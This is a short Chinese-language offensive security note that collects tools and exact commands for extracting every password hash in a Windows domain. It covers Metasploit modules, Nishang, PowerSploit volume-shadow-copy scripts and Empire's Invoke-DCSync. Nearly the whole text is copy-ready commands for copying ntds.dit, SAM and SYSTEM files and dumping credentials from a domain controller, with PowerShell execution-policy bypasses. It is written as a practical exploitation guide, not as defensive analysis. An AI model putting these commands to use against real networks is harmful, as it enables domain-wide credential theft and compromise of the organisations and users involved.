这是对于前文导出域内所有hash--笔记中所提及的利用方式进行一个补充，有需要可以收藏。



**MSF中的psexec_ndtsgrab模块：

①该脚本会使用卷影拷贝服务，将ntds.dit和SYSTEM文件复制到xxx目录下


②实际用法：

use auxiliary/admin/smb/psexec_ntdsgrabset rhosts 目标ipset SMBDomain 域名set SMBUser 域管用户名set SMBPass 域管密码exploit


执行完成会给出ntds.dit和SYSTEM文件的保存路径，移动到当前目录即可




**MSF中的domain_hashdump模块(该模块会获取域中所有hash)

①首先我们需要一个域管理员的meterpreter会话


②实际用法：

run post/windows/gather/credentials/domain_hashdumpexploit


或者拿到了域控的会话，直接hashdump，不过注意，又可能会让域控崩溃




**Nishang中的Copy-VSS.ps1：

一、实际使用：

powershell -exec bypass "import-module .\Copy-VSS.ps1;Copy-VSS"


会将SAM、SYSTEM、ntds.dit文件复制在脚本当前目录下，如果指定存放的路径，此路径必须是已经存在的，否则会报错




**Powersploit中的Invoke-NinjaCopy：

Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -LocalDestination ntds.dit


成功导出ntds.dit



**Powersploit中的VolumeShadowCopyTools.ps1：

一、脚本简介：

该脚本利用卷复制服务创建可用于提取文件的新卷，在域控制器上执行脚本。


二、实际操作：

①创建卷影副本

powershell -exec bypass "import-module .\VolumeShadowCopyTools.ps1;New-VolumeShadowCopy -Volume C:\ "    #注意\后面的空格不能少，否则会报错


②查看卷影路径

powershell -exec bypass "import-module .\VolumeShadowCopyTools.ps1;Get-VolumeShadowCopy"


③通过卷影复制ntds.dit

copy \\?\xxx\xx\windows\NTDS\ntds.dit c:\ntds.dit


④删除卷影副本

powershell -exec bypass "import-module .\VolumeShadowCopyTools.ps1;Remove-VolumeShadowCopy 卷影路径"



**Empire中的Invoke-DCSync.ps1：

一、脚本简介：

Invoke-DCSync.ps1可以利用dcsync直接读取ntds.dit文件，然后获取域中所有用户和密码hash


二、实际利用：

powershell -exec bypass "import-module .\Invoke-DCSync.ps1;Invoke-DCSync -PWDumpFormat"

-PWDumpFormat参数用来将结果格式化


在域管机器和域控机器均能测试成功
